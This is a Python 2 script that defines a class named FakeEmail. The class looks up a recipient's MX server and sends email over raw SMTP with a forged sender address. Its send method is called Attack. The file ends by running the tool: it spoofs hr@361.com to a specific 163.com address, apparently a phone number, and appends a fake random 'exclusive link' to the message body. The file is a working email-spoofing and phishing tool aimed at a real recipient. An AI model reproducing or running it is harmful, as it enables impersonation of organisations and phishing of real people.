# -*- coding: utf-8 -*-

import socket
import dns.resolver
import random
import string


class FakeEmail:
    def __init__(self, to_addr, from_addr, SMTP_addr="", port=25, timeout=10):
        self.to_addr = to_addr
        self.from_addr = from_addr
        self.port = port
        self.timeout = timeout
        self.SMTP_addrs = [SMTP_addr] if SMTP_addr else []

        self.quit_flag = 1
        self.succ_num = 0
        self.failed_num = 0

    def DNSQuery(self):
        resolver = dns.resolver.Resolver()
        resolver.timeout = 3
        resolver.lifetime = 3

        try:
            host = self.to_addr[self.to_addr.find(u"@")+1:]

            self.SMTP_addrs = [b'.'.join(d.exchange.labels).decode(u"utf8") for d in dns.resolver.query(host, u'MX')]
            assert len(self.SMTP_addrs) > 1  # 确保 dns 有结果

        except Exception as e:
            return (False, u"get MX record of %s failed: " % self.to_addr + str(e))

        return (True, u"get MX record of %s success" % host)

    def Connect(self):
        self.sk = socket.socket()
        self.sk.settimeout(self.timeout)

        try:
            self.sk.connect((self.SMTP_addr, self.port))
        except Exception as e:
            return (False, "connect to SMTP: "+self.SMTP_addr+":"+str(self.port)+" failed: "+str(e))

        return (True, "send connection request success")

    def Send(self, msgs):
        for msg in msgs.split(u"\r\n"):
            try:
                self.sk.sendall((msg+u"\r\n").encode("utf8"))
            except Exception as e:
                return (False, "send "+msg+"failed: "+str(e))
        return (True, "send msg success")

    def Recv(self, check=u""):
        try:
            data = [i.decode(u"utf8") for i in self.sk.recv(1024).split(b"\r\n") if i]
            assert data

        except AssertionError:
            return (False, u"recv empty answer")

        except Exception as e:
            return (False, "recv msg failed: "+str(e))

        if check and check not in data[-1]:  # 只检查最后一条消息
            return (False, "check failed: "+data[-1])

        # 400 - 600 为 smtp 的各种异常状态码
        if any([i for i in range(400, 600) if data[-1][:3] == str(i)]):
            return (False, "found error code: "+data[-1])

        return (True, data)

    def Attack(self, subject, body):
        '''
        攻击启动
        '''

        # 获得 smtp 地址
        print "get mx record"
        if not self.SMTP_addrs:  # 没有指定 smtp 的地址
            code, msg = self.DNSQuery()
            if not code:
                return (code, msg)

        for self.SMTP_addr in self.SMTP_addrs:
            code, msg = self.Connect()
            if not code:
                continue

            code, msg = self.Recv(check="220")
            if code:
                break
        else:
            return (code, msg)

        # 建立会话
        print "send ehlo"
        code, msg = self.Send(u"ehlo antispam")
        if not code:
            return (code, msg)

        code, msg = self.Recv()
        print msg
        if not code:
            return (code, msg)

        # 表明发件地址
        print "send mail from"
        code, msg = self.Send(u"mail from:<%s>" % self.from_addr)
        if not code:
            return (code, msg)

        code, msg = self.Recv()
        if not code:
            return (code, msg)

        # 表明收件地址
        print "send rcpt to"
        code, msg = self.Send(u"rcpt to:<%s>" % self.to_addr)
        if not code:
            return (code, msg)

        code, msg = self.Recv()
        if not code:
            return (code, msg)

        # 信件具体内容
        print "send data"
        code, msg = self.Send(u"data")
        if not code:
            return (code, msg)

        code, msg = self.Recv()
        if not code:
            return (code, msg)

        # to:
        print "send to"
        code, msg = self.Send(u"to: %s" % self.to_addr)
        if not code:
            return (code, msg)

        # from:
        print "send from"
        code, msg = self.Send(u"from: %s" % self.from_addr)
        if not code:
            return (code, msg)

        # subject:
        print "send subject"
        code, msg = self.Send("subject: "+subject)
        if not code:
            return (code, msg)

        # body:
        print "send body"
        code, msg = self.Send(body+u"\r\n\r\n你的专属链接为："+"".join(
            random.choice(string.hexdigits)
            for i in range(32))+"\r\n.\r\n"
        )

        code, msg = self.Recv(check="250")
        if not code:
            return (code, msg)

        return (code, msg)


test = FakeEmail(
    to_addr="15619047890@163.com",
    from_addr="hr@361.com",
    timeout=10
)

print test.Attack("hello! my friend!", "hr: you got it!")
